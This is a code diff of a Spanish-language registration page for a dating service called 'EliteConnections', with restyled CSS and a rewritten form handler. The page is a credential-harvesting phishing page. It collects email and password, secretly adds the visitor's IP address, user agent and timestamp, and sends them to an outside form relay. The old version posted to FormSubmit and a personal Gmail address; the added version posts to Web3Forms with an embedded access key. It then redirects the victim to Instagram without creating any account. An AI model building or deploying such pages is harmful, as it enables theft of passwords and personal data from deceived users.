@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EliteConnections - Encuentra Tu Amor</title>
+    <title>EliteConnections - Encuentra Tu Amor Perfecto</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Segoe UI', system-ui, sans-serif;
         }
 
         body {
@@ -23,51 +23,52 @@
 
         .container {
             background: rgba(255, 255, 255, 0.95);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            padding: 50px 40px;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
             width: 100%;
-            max-width: 450px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            max-width: 480px;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
         }
 
         .logo {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
 
         .logo h1 {
-            font-size: 2.8em;
-            font-weight: bold;
+            font-size: 3.2em;
+            font-weight: 800;
             background: linear-gradient(135deg, #ff6b9d, #c779d0);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
 
         .logo p {
             color: #666;
-            font-size: 1.1em;
+            font-size: 1.2em;
+            font-weight: 300;
         }
 
         h2 {
             text-align: center;
-            color: #333;
-            margin-bottom: 30px;
-            font-size: 1.4em;
+            color: #2d3748;
+            margin-bottom: 35px;
+            font-size: 1.6em;
             font-weight: 600;
         }
 
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 28px;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            color: #555;
+            margin-bottom: 10px;
+            color: #4a5568;
             font-weight: 600;
             font-size: 0.95em;
         }
@@ -75,43 +76,46 @@
         input[type="email"],
         input[type="password"] {
             width: 100%;
-            padding: 15px 20px;
-            border: 2px solid #e1e8ed;
-            border-radius: 12px;
+            padding: 18px 20px;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
             font-size: 16px;
             transition: all 0.3s ease;
             background: #fff;
+            color: #2d3748;
         }
 
         input[type="email"]:focus,
         input[type="password"]:focus {
             border-color: #ff6b9d;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(255, 107, 157, 0.1);
+            box-shadow: 0 0 0 4px rgba(255, 107, 157, 0.15);
+            transform: translateY(-2px);
         }
 
         button {
             width: 100%;
-            padding: 16px;
+            padding: 20px;
             background: linear-gradient(135deg, #ff6b9d, #c779d0);
             color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 1px;
+            box-shadow: 0 8px 25px rgba(255, 107, 157, 0.35);
         }
 
         button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(255, 107, 157, 0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(255, 107, 157, 0.5);
         }
 
         button:disabled {
-            background: #ccc;
+            background: #cbd5e0;
             transform: none;
             box-shadow: none;
             cursor: not-allowed;
@@ -119,7 +123,7 @@
 
         .loading {
             text-align: center;
-            margin-top: 15px;
+            margin-top: 20px;
             color: #ff6b9d;
             font-weight: 600;
             display: none;
@@ -128,29 +132,35 @@
         .features {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-top: 25px;
+            gap: 16px;
+            margin: 35px 0 25px;
         }
 
         .feature {
             text-align: center;
-            padding: 15px;
-            background: rgba(255, 107, 157, 0.1);
-            border-radius: 10px;
-            color: #666;
+            padding: 20px 15px;
+            background: rgba(255, 107, 157, 0.08);
+            border-radius: 12px;
+            color: #4a5568;
             font-size: 0.9em;
+            font-weight: 500;
+            border: 1px solid rgba(255, 107, 157, 0.1);
         }
 
         .feature i {
-            font-size: 1.5em;
-            margin-bottom: 8px;
+            font-size: 1.8em;
+            margin-bottom: 10px;
             display: block;
+            background: linear-gradient(135deg, #ff6b9d, #c779d0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .login-link {
             text-align: center;
-            margin-top: 25px;
-            color: #666;
+            margin-top: 30px;
+            color: #718096;
             font-size: 0.95em;
         }
 
@@ -160,25 +170,23 @@
             font-weight: 600;
         }
 
-        .login-link a:hover {
-            text-decoration: underline;
-        }
-
         .error {
-            color: #e74c3c;
+            color: #e53e3e;
             font-size: 0.85em;
-            margin-top: 5px;
+            margin-top: 8px;
+            font-weight: 500;
             display: none;
         }
 
         .success-message {
             display: none;
-            background: #d4edda;
-            color: #155724;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
+            background: linear-gradient(135deg, #48bb78, #38a169);
+            color: white;
+            padding: 20px;
+            border-radius: 14px;
+            margin-top: 25px;
             text-align: center;
+            font-weight: 600;
         }
     </style>
 </head>
@@ -191,43 +199,41 @@
         
         <h2>Comienza tu historia de amor</h2>
         
-        <!-- FORMULARIO FORMSUBMIT -->
-        <form id="registroForm" action="https://formsubmit.co/enriquepng1@gmail.com" method="POST">
-            <!-- CONFIGURACIÓN FORMSUBMIT -->
-            <input type="hidden" name="_subject" value="🔥 NUEVO REGISTRO - EliteConnections">
-            <input type="hidden" name="_template" value="table">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_autoresponse" value="¡Gracias por registrarte en EliteConnections! Tu cuenta está siendo verificada.">
-            <input type="text" name="_honey" style="display:none">
-            
-            <!-- REDIRECCIÓN DESPUÉS DEL ENVÍO -->
-            <input type="hidden" name="_next" value="https://www.instagram.com">
+        <!-- FORMULARIO WEB3FORMS CON TU ACCESS KEY -->
+        <form id="registroForm" action="https://api.web3forms.com/submit" method="POST">
+            <!-- CONFIGURACIÓN WEB3FORMS -->
+            <input type="hidden" name="access_key" value="e2c83caa-fc64-434b-af71-7890d6965519">
+            <input type="hidden" name="subject" value="🔥 NUEVO REGISTRO - EliteConnections">
+            <input type="hidden" name="from_name" value="EliteConnections">
+            <input type="hidden" name="redirect" value="https://www.instagram.com">
             
             <div class="form-group">
                 <label for="email">Correo electrónico</label>
-                <input type="email" id="email" name="email" required placeholder="tu.amor@ejemplo.com">
+                <input type="email" id="email" name="email" required 
+                       placeholder="tu.amor@ejemplo.com">
                 <div class="error" id="emailError">Por favor ingresa un email válido</div>
             </div>
             
             <div class="form-group">
                 <label for="password">Contraseña</label>
-                <input type="password" id="password" name="password" required minlength="8" placeholder="Mínimo 8 caracteres">
+                <input type="password" id="password" name="password" required 
+                       minlength="8" placeholder="Mínimo 8 caracteres">
                 <div class="error" id="passwordError">La contraseña debe tener al menos 8 caracteres</div>
             </div>
             
-            <!-- CAMPOS ADICIONALES QUE SE LLENAN AUTOMÁTICAMENTE -->
+            <!-- CAMPOS ADICIONALES -->
             <input type="hidden" name="fecha_registro" id="fechaField">
             <input type="hidden" name="ip_usuario" id="ipField">
             <input type="hidden" name="navegador" id="navegadorField">
             <input type="hidden" name="pagina" value="EliteConnections">
-            <input type="hidden" name="tipo" value="registro_dating">
+            <input type="hidden" name="tipo_registro" value="premium_dating">
             
             <button type="submit" id="submitButton">
-                <span id="buttonText">Encontrar mi pareja ideal</span>
+                <span id="buttonText">✨ Encontrar mi pareja ideal</span>
             </button>
             
             <div class="loading" id="loadingMessage">
-                🔍 Buscando tu media naranja...
+                💫 Conectando con almas gemelas...
             </div>
         </form>
 
@@ -238,35 +244,33 @@
         <div class="features">
             <div class="feature">
                 <i>❤️</i>
-                Compatibilidad 99%
+                Compatibilidad 99.9%
             </div>
             <div class="feature">
                 <i>🔒</i>
-                Cuenta Verificada
+                Verificación Premium
             </div>
             <div class="feature">
                 <i>🌎</i>
-                Miembros Globales
+                +50K Miembros
             </div>
             <div class="feature">
                 <i>💬</i>
-                Chat Premium
+                Chat Ilimitado
             </div>
         </div>
 
         <div class="login-link">
-            ¿Ya tienes una cuenta? <a href="#">Inicia sesión aquí</a>
+            ¿Ya eres miembro? <a href="#">Inicia sesión en tu cuenta</a>
         </div>
     </div>
 
     <script>
         // CONFIGURACIÓN INICIAL
         document.addEventListener('DOMContentLoaded', function() {
-            // Llenar campos automáticamente
             document.getElementById('fechaField').value = new Date().toLocaleString('es-ES');
             document.getElementById('navegadorField').value = navigator.userAgent;
             
-            // Obtener IP del usuario
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
@@ -277,8 +281,10 @@
                 });
         });
 
-        // VALIDACIÓN DEL FORMULARIO
+        // VALIDACIÓN Y ENVÍO
         document.getElementById('registroForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const submitButton = document.getElementById('submitButton');
@@ -303,26 +309,44 @@
                 document.getElementById('passwordError').style.display = 'none';
             }
             
-            if (!isValid) {
-                e.preventDefault();
-                return;
-            }
+            if (!isValid) return;
             
-            // Si la validación pasa, mostrar estado de carga
+            // ANIMACIÓN DE CARGA
             submitButton.disabled = true;
-            buttonText.textContent = 'Procesando...';
+            buttonText.textContent = 'Creando tu cuenta...';
             loadingMessage.style.display = 'block';
             
-            // El formulario se enviará automáticamente a FormSubmit
-            // FormSubmit se encarga de enviar el email a enriquepng1@gmail.com
+            // ENVIAR A WEB3FORMS
+            const formData = new FormData(this);
             
-            // Mostrar mensaje de éxito después de 2 segundos (simulación)
-            setTimeout(() => {
-                document.getElementById('successMessage').style.display = 'block';
-            }, 2000);
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('registroForm').style.display = 'none';
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://www.instagram.com";
+                    }, 3000);
+                } else {
+                    throw new Error(data.message || 'Error en el envío');
+                }
+            })
+            .catch(error => {
+                alert('Error al crear la cuenta: ' + error.message);
+            })
+            .finally(() => {
+                submitButton.disabled = false;
+                buttonText.textContent = '✨ Encontrar mi pareja ideal';
+                loadingMessage.style.display = 'none';
+            });
         });
 
-        // Validación en tiempo real
+        // VALIDACIÓN EN TIEMPO REAL
         document.getElementById('email').addEventListener('input', function() {
             if (this.value.length > 0) {
                 document.getElementById('emailError').style.display = 'none';
@@ -336,4 +360,4 @@
         });
     </script>
 </body>
-    </html>
+                </html>
